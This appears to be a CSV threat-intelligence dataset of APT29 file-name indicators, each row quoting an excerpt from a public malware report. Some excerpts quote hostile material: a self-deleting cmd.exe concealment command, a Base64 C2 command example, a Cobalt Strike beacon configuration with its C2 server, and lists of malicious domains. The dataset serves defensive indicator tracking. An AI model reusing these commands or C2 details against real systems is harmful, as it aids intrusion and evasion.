schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--apt29,artifact--sha256:3c3e5ae33e04f45ed55308ab20f6881ed0e1312a41fc9311461348dc01d6a56f,observation--sha256:780edf014eb3d8745c2e464792c75455685297af152bc9826944ae8b26dc6e77,file-name,build_eu.ps1,build_eu.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 28}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 31. VictimTotal Sandbox testing a given sample compiled for the US targets Figure 32. VictimTotal Sandbox testing a given sample compiled for EU targets If the uploaded file gets a different detection result, the website notifies the logged-in user. This feature indicates that SilverFish group members are tracking the detection rate of their payloads in real time. The PTI Team also noticed two payloads uploaded to the file detection sandbox panel, one of whi",
1.0.0,actor--apt29,artifact--sha256:3c3e5ae33e04f45ed55308ab20f6881ed0e1312a41fc9311461348dc01d6a56f,observation--sha256:5630e49970b7e44916012c7160e0284c0831ad7da60fd3f64e5cd0e77511df91,file-name,build_eu.ps1,build_eu.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 29}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.4.1 NetSupport Remote Control During the analysis made on the C&C server contents, PTI team was able to gather the buildus9_3.ps1 and build_eu.ps1 files that are uploaded to detection sandbox panel which is explained in section 3.4. At first glance, PTI team observed that the files are heavily obfuscated and the main payload is encrypted using AES encryption. Figure 33. Encoded contents of buildus9_3.ps1 file After de-obfuscating and extracting the decrypted payl",
1.0.0,actor--apt29,artifact--sha256:3c3e5ae33e04f45ed55308ab20f6881ed0e1312a41fc9311461348dc01d6a56f,observation--sha256:91ba7141503f439101b311ba73836b6674f4d76b18ad0ae98f7a8996489235bc,file-name,build_eu.ps1,build_eu.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 30}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 35. Contents of the extracted ZIP file Amoung the extracted ZIP file contents, client32.ini file contains the necessary configuration settings for NetSupportManager remote access software. PTI Team extracted the both client32.ini configuration files from buildus9_3.ps1 and build_eu.ps1 Powershell scripts. Extracted INI files contains a HTTP field that includes gateway and secondary gateway address values. Figure 36. Extracted client32.ini file for buildus9_3",
1.0.0,actor--apt29,artifact--sha256:3c3e5ae33e04f45ed55308ab20f6881ed0e1312a41fc9311461348dc01d6a56f,observation--sha256:48c2d45aff195c294cd62afb8e07d9f7c0bcbcfe49fd29623cf0b749faf3da6a,file-name,build_eu.ps1,build_eu.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 34}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 4.2 Affected Countries and Sectors As also explained in the Section 3.4 of this report, the PTI Team believes that the SilverFish campaign was operating in a ”region-specific” fashion, as the PTI Team has witnessed specific malware builds such as build_eu.ps1 and buildus9_3.ps1. In accordance with these findings, we can see that the overall attack target tends to be very similar between the US and the EU. While the US is by far the most frequently-targeted region w",
1.0.0,actor--apt29,artifact--sha256:3c3e5ae33e04f45ed55308ab20f6881ed0e1312a41fc9311461348dc01d6a56f,observation--sha256:e44d35b50bc2d3e647d7f670a87761197ed3ae317c3d5ece0e6dbfcbaa69d59c,file-name,build_eu.ps1,build_eu.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 8}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Advanced Post Exploitation Skillset : Executed commands and specially crafted scripts used by the SilverFish group strongly indicates sophistication and an advanced post-exploitation skillset. There are multiple attempts for pivoting to internal systems on critical infrastructure after the initial domain enumeration of victims. Exclusively Targeting Critical Infrastructures in the US and EU :Following a detailed inspection on the C&C panel, PTI Team has seen that t",
1.0.0,actor--apt29,artifact--sha256:01c337bd6f88c59988a92f6fde30da295b690420be8c0910cf6c01f2757b9b87,observation--sha256:919d13ed1a0ca4aef108cc59cb9bf37494c0f3c058d899f63baebc22a96e5729,file-name,buildus9_3.ps1,buildus9_3.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 28}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 31. VictimTotal Sandbox testing a given sample compiled for the US targets Figure 32. VictimTotal Sandbox testing a given sample compiled for EU targets If the uploaded file gets a different detection result, the website notifies the logged-in user. This feature indicates that SilverFish group members are tracking the detection rate of their payloads in real time. The PTI Team also noticed two payloads uploaded to the file detection sandbox panel, one of whi",
1.0.0,actor--apt29,artifact--sha256:01c337bd6f88c59988a92f6fde30da295b690420be8c0910cf6c01f2757b9b87,observation--sha256:4a221e97d0305c67220064cc3eef45aa41748fe30d5627538728a5ed921fee89,file-name,buildus9_3.ps1,buildus9_3.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 29}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.4.1 NetSupport Remote Control During the analysis made on the C&C server contents, PTI team was able to gather the buildus9_3.ps1 and build_eu.ps1 files that are uploaded to detection sandbox panel which is explained in section 3.4. At first glance, PTI team observed that the files are heavily obfuscated and the main payload is encrypted using AES encryption. Figure 33. Encoded contents of buildus9_3.ps1 file After de-obfuscating and extracting the decrypted payl",
1.0.0,actor--apt29,artifact--sha256:01c337bd6f88c59988a92f6fde30da295b690420be8c0910cf6c01f2757b9b87,observation--sha256:670a24fc7fa83d02ac45360f89e655233ae5ff5c811bc45c0fc35e0043910466,file-name,buildus9_3.ps1,buildus9_3.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 30}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 35. Contents of the extracted ZIP file Amoung the extracted ZIP file contents, client32.ini file contains the necessary configuration settings for NetSupportManager remote access software. PTI Team extracted the both client32.ini configuration files from buildus9_3.ps1 and build_eu.ps1 Powershell scripts. Extracted INI files contains a HTTP field that includes gateway and secondary gateway address values. Figure 36. Extracted client32.ini file for buildus9_3",
1.0.0,actor--apt29,artifact--sha256:01c337bd6f88c59988a92f6fde30da295b690420be8c0910cf6c01f2757b9b87,observation--sha256:00402ea6d22a19c5412247376b21b7acf6d7b4d9b8dedc1db1f2de4adcb07994,file-name,buildus9_3.ps1,buildus9_3.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 34}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 4.2 Affected Countries and Sectors As also explained in the Section 3.4 of this report, the PTI Team believes that the SilverFish campaign was operating in a ”region-specific” fashion, as the PTI Team has witnessed specific malware builds such as build_eu.ps1 and buildus9_3.ps1. In accordance with these findings, we can see that the overall attack target tends to be very similar between the US and the EU. While the US is by far the most frequently-targeted region w",
1.0.0,actor--apt29,artifact--sha256:01c337bd6f88c59988a92f6fde30da295b690420be8c0910cf6c01f2757b9b87,observation--sha256:2b32392e33fb9c2f7e145b25e7bf919d5e740a8ea2e26557f9d0fc4d96a57305,file-name,buildus9_3.ps1,buildus9_3.ps1,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 8}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Advanced Post Exploitation Skillset : Executed commands and specially crafted scripts used by the SilverFish group strongly indicates sophistication and an advanced post-exploitation skillset. There are multiple attempts for pivoting to internal systems on critical infrastructure after the initial domain enumeration of victims. Exclusively Targeting Critical Infrastructures in the US and EU :Following a detailed inspection on the C&C panel, PTI Team has seen that t",
1.0.0,actor--apt29,artifact--sha256:03a5563d05b8298a697bcf073c297cc0cae8b23bdabca397cfd25ebb2251fcfb,observation--sha256:6627d21ad31a1f86f678b45d1821baacdb3823448d96d7d15c68d4e63a70e5c6,file-name,circl-analysisreport-miniduke-stage3-public.pdf,circl-analysisreport-miniduke-stage3-public.pdf,candidate,2013-02-01T00:00:00Z,month,known,same-record,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 27 The MiniDuke toolset consists of multiple downloader and backdoor components, which are commonly referred to as the MiniDuke “stage 1”, “stage 2”, and “stage 3” components as per Kaspersky’s original MiniDuke whitepaper. Additionally, a specific loader is often associated with the MiniDuke toolset and is referred to as the “MiniDuke loader”. While the loader has often been used together with other MiniDuke components, it has also commonly been used in conju",
1.0.0,actor--apt29,artifact--sha256:ef75e5272b27c6743c6debea4b24569edb0289cc091dc56107580ca3b3d24e5a,observation--sha256:9d1fd9cffaf62b50c7ddb6fa8daa8247ee9e794227324b308f5f07e4fd26b0aa,file-name,client32.exe,client32.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 29}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.4.1 NetSupport Remote Control During the analysis made on the C&C server contents, PTI team was able to gather the buildus9_3.ps1 and build_eu.ps1 files that are uploaded to detection sandbox panel which is explained in section 3.4. At first glance, PTI team observed that the files are heavily obfuscated and the main payload is encrypted using AES encryption. Figure 33. Encoded contents of buildus9_3.ps1 file After de-obfuscating and extracting the decrypted payl",
1.0.0,actor--apt29,artifact--sha256:1c734b61ffb1014697ff4696e7147c77cce34c2fb58bea49a056b79dbfe61d01,observation--sha256:0f7134922ac4fb120a3dc76dd5c6bc09df04d2551b523853005a66347c7e55c9,file-name,client32.ini,client32.ini,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 30}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 35. Contents of the extracted ZIP file Amoung the extracted ZIP file contents, client32.ini file contains the necessary configuration settings for NetSupportManager remote access software. PTI Team extracted the both client32.ini configuration files from buildus9_3.ps1 and build_eu.ps1 Powershell scripts. Extracted INI files contains a HTTP field that includes gateway and secondary gateway address values. Figure 36. Extracted client32.ini file for buildus9_3",
1.0.0,actor--apt29,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:cdd154a1511a372d343b7f5f967b4ed30772c12c28ecf120125fe43ca299678b,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Figure8: Refreshtokenrequest madebyGraphicalProton Source: RecordedFuture) After obtaininganewtoken, awordlist isusedtocreatearandomlynameddirectoryunder theOneDriveaccount’sApp\Teams_Test folder. Next, 2randomlynamedsubdirectoriesarecreatedtocontainC2communicationstoandfromthevictim. GraphicalProtonthengathersthevictim’ssysteminformation—includingtheir username, computer name, Windowsversion, networkconnections, andalist of runningprocesses—byrunningthefollowingcomma",
1.0.0,actor--apt29,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:7e54f963f9c8a94ab48cb326db6c5f1174d3fd002f04f676ad2c73aad85aa411,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 100}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5299 If Subkey 6 does not exist, the function returns a default value with the following fields: <iteration> : Value between 5 and 20 (depending on each sample) <id> : 0 <command> : %SystemRoot%\System32\cmd.exe /c “ping 127 .0.0.1 -n 30 & del /F “%PROCESSOR_IDENTIFIER%” <EnvironmentVariableExpanded> : $(PROCESSOR_IDENTIFIER) <EnvironmentVariable> : PROCESSOR_IDENTFIER This command returns the Accept and User-Agent headers in the result. 3.4.3.4 GET HEADERS Illustration 94. GET HEAD",
1.0.0,actor--apt29,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:b38aa235eeec88cfb93ec825b3c98db3b26a916c550dca302cd989e282cbe0eb,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 108}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB52107 This command allows you to execute the following command: %SytemRoot%\System32\cmd.exe ping 127.0.0.1 -n 30 & del /F %EXE_PATH% The purpose of the command is to delete the executable from the disk as a means of concealment. It matches the default command and will be executed if the command includes the argument “-die.” 3.4.3. 10 KILL Illustration 101. KILL function If execution fails, the result will display an error “key_word”. payload",
1.0.0,actor--apt29,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:473e5c20800733524f1beafb008a3456647aa3532bfb6b7b9e89e92a6ade2c10,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 97}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"96Easter Bunny This command allows you to process a command sent from the C2 encoded in Base64. The encoded command will have a fixed structure so that it can be processed correctly: 3.4.3. 1 SEND COMMAND If we want it to be executed in iteration 2, we will encode the following in Base64: EXAMPLE OF USE 2 0 %SYSTEMROOT%\System32\cmd.exe /c ping 127.0.0.1 -n 35 & del /F %COMPUTERNAME% $(COMPUTERNAME) COMPUTERNAME Finally, it will send the following command: :mnxqsq MgowCiVTWVNURU1ST09UJVxTeXN0ZW0",
1.0.0,actor--apt29,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:fec12431999eadea2c3e32fd661894299f4a212d034e441d44265b7c74b3dcf5,file-name,cmd.exe,cmd.exe,candidate,2023-09-26T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 25 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793 On a Windows system, the log file C:\TeamCity\logs\teamcity-server.log will contain a log message when an attacker modified the internal.properties file. There will also be a log message for every process created via the /app/rest/debug/processes endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token w",
1.0.0,actor--apt29,artifact--sha256:7b034fe7fcb6f3be9b68cced37f2e83b734eca1abc48b9d16f3f1f5749b85221,observation--sha256:7ce951945bd4b28845e504da1c3a5b2c5a05434a42151de2abe09f4abef06134,file-name,contact.php,contact.php,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,CYBERTHREATANALYSIS| RUSSIA AppendixA—IndicatorsofCompromise Compromised Domains Associated with BlueBravo Activity:te-as[.]noeasym6[.]comremcolours[.]comsimplesalsamix[.]comsylvio[.]com[.]brreidao[.]commightystake[.]comsharpledge[.]comfondoftravel[.]com URLs Associated with BlueBravo Activity:te-as[.]no/wine[.]phpeasym6[.]com/Information.phpreidao[.]com/dashboard.phpresetlocations[.]com/bmw.htmsimplesalsamix[.]com/e-yazi.htmlsylvio.com[.]br/form.phpmightystake[.]com/sponsorship.phpsharpledge[.],
1.0.0,actor--apt29,artifact--sha256:8b2a303e15fd864d4dd57a4e4bd895dd39579681743014d9472ba4230fdd1f99,observation--sha256:4ea45736cdddb38a47f8154698376f7194721906f29708a2e1a961354656f1d0,file-name,copies7za.exe,copies7za.exe,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS victim’s machine. The DLL is written in C   and contains only 1 export function  DeviceAll), whichsimply returns when called. The actual malicious code is implemented in a thread that is spawned inDLLMain during the DLL’s initialization. Multiple anti-analysis and evasion techniques are usedthroughout the malware including API unhooking, dynamically resolving APIs, string encryption, andsandbox evasion. When GraphicalNeutrino starts a thread, it attempts to remove any API h",
1.0.0,actor--apt29,artifact--sha256:a6e6ec4354b380e5dcc0e8e31d4f7ccae0dec811b94402fa57c75050ec87703f,observation--sha256:facb58f499df83035381f7667cd337ed49d2a79dd76f95698b4032ffaeca3bbb,file-name,cosmicduke_whitepaper.pdf,cosmicduke_whitepaper.pdf,candidate,2013-02-01T00:00:00Z,month,known,same-record,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 37 BIBLIOGRAPHY 1. The White House; Remarks By President Barack Obama In Prague As Delivered; published 5 April 2009; [Online]. Available: https://www.whitehouse.gov/the-press-office/remarks-president-barack-obama-prague-delivered 2. Wikipedia; KavKaz Center; [Online]. Available: https://en.wikipedia.org/wiki/Kavkaz_Center 3. BBC: Nato exercises ‘a dangerous move’; published 17 April 2009; [Online]. Available: http://news.bbc.co.uk/2/hi/ europe/8004399.stm 4. ",
1.0.0,actor--apt29,artifact--sha256:a9cca91688e1c653739ec0163b889739533dbd58d29fb0495d37db674b36c0ab,observation--sha256:18d7635cc36676da8bdb9fc780269a563c4739dcead0360beaf3ec0a20124ca1,file-name,ctfmon.exe,ctfmon.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 29}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.4.1 NetSupport Remote Control During the analysis made on the C&C server contents, PTI team was able to gather the buildus9_3.ps1 and build_eu.ps1 files that are uploaded to detection sandbox panel which is explained in section 3.4. At first glance, PTI team observed that the files are heavily obfuscated and the main payload is encrypted using AES encryption. Figure 33. Encoded contents of buildus9_3.ps1 file After de-obfuscating and extracting the decrypted payl",
1.0.0,actor--apt29,artifact--sha256:e62876c0b6274e6abf6b694b2a9dbcb96f83433e331b6c826ad4ad794fa13427,observation--sha256:fd74f9f73498a0ac46c976f990f989e3b342f50ec3ff4f121421999cff18de9d,file-name,dllhost.exe,dllhost.exe,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 16/24 Payloads We have managed to collect two variants of payloads delivered via SNOWYAMBER: 1. CobaltStrike Beacon. Presented below is an extracted beacon configuration16: BeaconType - HTTPS Port - 443 SleepTime - 37000 MaxGetSize - 1048576 Jitter - 33 MaxDNS - Not Found PublicKey_MD5 - 92b602d1008704ef300d29ca014c6e21 C2Server - humanecosmetics.com,/category/noteworthy/6426- 7346-9789 UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64",
1.0.0,actor--apt29,artifact--sha256:6a033d3ad3fd1a0722f98f13005771880f18722e8cda1ad68e0a331fab5e534e,observation--sha256:49790af3be17cbd9b5ba4faca451527f0461a20dfaa12fea0442cf1ae3482a3e,file-name,e-yazi.docx,e-yazi.docx,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,CYBERTHREATANALYSIS| RUSSIA 62a903a4b5cd27d739950e71ab74061e815af4830a29df6dcbf8c1a34abc87cb bmw8.png.lnk3a76182529c4fd5276091ed8ff4c4dcc89e4abc5981348a066c4eb34a9956947 bmw9.png.lnk38f8b8036ed2a0b5abb8fbf264ee6fd2b82dcd917f60d9f1d8f18d07c26b1534$Recycle.Bin/AppvIsvSubsystems64.dll706112ab72c5d770d89736012d48a78e1f7c643977874396c30908fa36f2fed7 $Recycle.Bin/MSVCP140.dlle3abb477f3230c94bfc97ec8f7cee8d4ad4a1fba16cda1f318cfa12780fd33f7$Recycle.Bin/Mso20Win32Client.DLLd0a3632404c5b4b224269ecedfbcdf2,
1.0.0,actor--apt29,artifact--sha256:61dd274f2935e8f9479ea65e723440509a25f5395bcc2384b53844f75dc19ec4,observation--sha256:12ccd1748fa5279f7c483bf0d2a26e4ed050b4e348edffe23925529d17366155,file-name,e-yazi.zip,e-yazi.zip,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Figure5  BlueBravolurethemedaroundautomobilesaleinKyiv Source: RecordedFuture) simplesalsamix[.]com OnMarch24, 2023, Insikt Groupidentifiedthedomainsimplesalsamix[.]com, hostedontheIP50.116.94 . 178, deliveringamaliciousZIPfile“e-yazi.zip”  SHA256 0dd55a234be8e3e07b0eb19f47abe594295889564ce6a9f6e8cc4d3997018839 viathewebpagee-yazi.html.  E-yazi translatestotheterm“e-mail” inTurkishandlikelyservesasanother characteristicof thebroader natureof thelureandintendedtarget o",
1.0.0,actor--apt29,artifact--sha256:778dced5a3bf8174ab0369cfada95f4def5ded7d3849c5c92d1a425dc1075e24,observation--sha256:27c525952b2c25b1827fe320b4e89f2db94e2e446e42376349283d381eefc1f5,file-name,envsrv.dll,envsrv.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 10/20 If OPSEC checks are passed, a new thread is spawned. The new thread again executes the same OPSEC- related code blocks (initialize APIs, unhook modules, check for sleep emulation, check for proper parent name) and, if all checks are passed, loads and injects the next stage into a randomly selected process. 1. __int64 InjectThread() 2. { 3. // Reused code blocks have been simplified 4. ResolveAPIs(); 5. UnhookDLLs(); 6. CheckForSleep",
1.0.0,actor--apt29,artifact--sha256:778dced5a3bf8174ab0369cfada95f4def5ded7d3849c5c92d1a425dc1075e24,observation--sha256:0da6f6ea58aac634c901e4c7ab5073236e6c61e88b4785ed7b2968931e219480,file-name,envsrv.dll,envsrv.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 11/20 envsrv.dll Envsrv.dll is responsible for facilitating persistence via the Run registry key. Envsrv.dll has one export (named unify, ord #2). It closely follows a previously established pattern, reusing exactly the same code blocks. A simplified codeflow is presented on the listing below: 1. __int64 unify() 2. { 3. // Reused code blocks have been simplified 4. ResolveAPIs(); 5. UnhookDLLs(); 6. CheckForSleepEmulation(); 7. Initialize",
1.0.0,actor--apt29,artifact--sha256:778dced5a3bf8174ab0369cfada95f4def5ded7d3849c5c92d1a425dc1075e24,observation--sha256:592288a024a5f185b97ff041f27089e076de59aa8e722bcecd247b2faffa252b,file-name,envsrv.dll,envsrv.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 17/20 Indicator Value 3rd module File Name envsrv.dll File Size 56KB MD5 2ffaa8cbc7f0d21d03d3dd897d974dba SHA1 6dff9a9f13300a5ce72a70d907ff7854599e990a SHA256 cfa65036aff012d7478694ea733e3e882cf8e18f336af5fba3ed2ef29160d45b Indicator Value 4th module (shellcode stager) File Name mschost.dll File Size 391KB MD5 5b6d8a474c556fe327004ed8a33edcdb SHA1 a677b6aa958fe02cac0730d36e8123648e02884f SHA256 86edfd6c7a2fab8c50a372494e3d5b08c032cca75439,
1.0.0,actor--apt29,artifact--sha256:778dced5a3bf8174ab0369cfada95f4def5ded7d3849c5c92d1a425dc1075e24,observation--sha256:ae6bb52b7f433947b106a65031d84efc723110a4aeede47352b5e3da73d9fc84,file-name,envsrv.dll,envsrv.dll,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 2/20 Table of Contents Table of Contents ................................ ................................ ................................ ................................ ................................ .......... 2 Threat Summary ................................ ................................ ................................ ................................ ................................ ............ 3 Detailed Technical Analysis ,
1.0.0,actor--apt29,artifact--sha256:778dced5a3bf8174ab0369cfada95f4def5ded7d3849c5c92d1a425dc1075e24,observation--sha256:23006b251357e083ddea89d46c5cd9363b5814ac9e58e5fe17e9495ba5ffa704,file-name,envsrv.dll,envsrv.dll,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 7/11 Indicator Value 3rd module File Name envsrv.dll File Size 56KB MD5 2ffaa8cbc7f0d21d03d3dd897d974dba SHA1 6dff9a9f13300a5ce72a70d907ff7854599e990a SHA256 cfa65036aff012d7478694ea733e3e882cf8e18f336af5fba3ed2ef29160d45b Indicator Value 4th module (shellcode stager) File Name mschost.dll File Size 391KB MD5 5b6d8a474c556fe327004ed8a33edcdb SHA1 a677b6aa958fe02cac0730d36e8123648e02884f SHA256 86edfd6c7a2fab8c50a372494e3d5b08c032cca754396,
